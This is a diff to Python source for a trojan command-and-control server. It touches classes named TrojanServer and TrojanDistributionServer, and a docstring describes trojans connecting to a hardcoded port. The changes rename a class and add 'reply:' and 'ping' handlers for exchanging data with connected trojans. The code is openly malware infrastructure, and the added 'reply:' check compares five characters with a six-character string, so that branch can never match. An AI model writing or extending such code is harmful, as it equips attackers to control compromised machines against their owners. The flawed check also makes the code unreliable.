@@ -1,5 +1,4 @@
 __author__ = 'Jonas'
-
 import threading
 import socket
 import time
@@ -146,6 +145,12 @@ class TrojanServer(threading.Thread):
                 connection.sendall(str.encode(self.send_buffer))
                 self.send_buffer = ""
                 self.recv_buffer = (str(connection.recv(16384))[2:-1])
+            elif request[:5] == "reply:":
+                connection.sendall(str.encode("ok"))
+                self.recv_buffer = (str(connection.recv(16384))[2:-1])
+            elif request == "ping":
+                connection.sendall(str.encode("ping"))
+            connection.close()
 
     def send(self, string):
         """
@@ -228,7 +233,7 @@ class PortManager(threading.Thread):
         return self.ports.iter()
 
 
-class TrojanConnectionServer(threading.Thread):
+class TrojanDistributionServer(threading.Thread):
     """
     A Server object, resembling the first thing every trojan connects to, its port should be globally known and even
     hardcoded into the trojans sourcecode itself. Trojans send a connection request together with their name here, after
@@ -296,7 +301,7 @@ class TrojanFlowControlServer:
         self.user_server = TCPServer()
         self.user_server.start()
         # creating the server, managing the initial connection requests
-        self.connection_server = TrojanConnectionServer(self.connection_port, self.open_ports, self.trojans)
+        self.connection_server = TrojanDistributionServer(self.connection_port, self.open_ports, self.trojans)
         self.connection_server.start()
 
     def run(self):
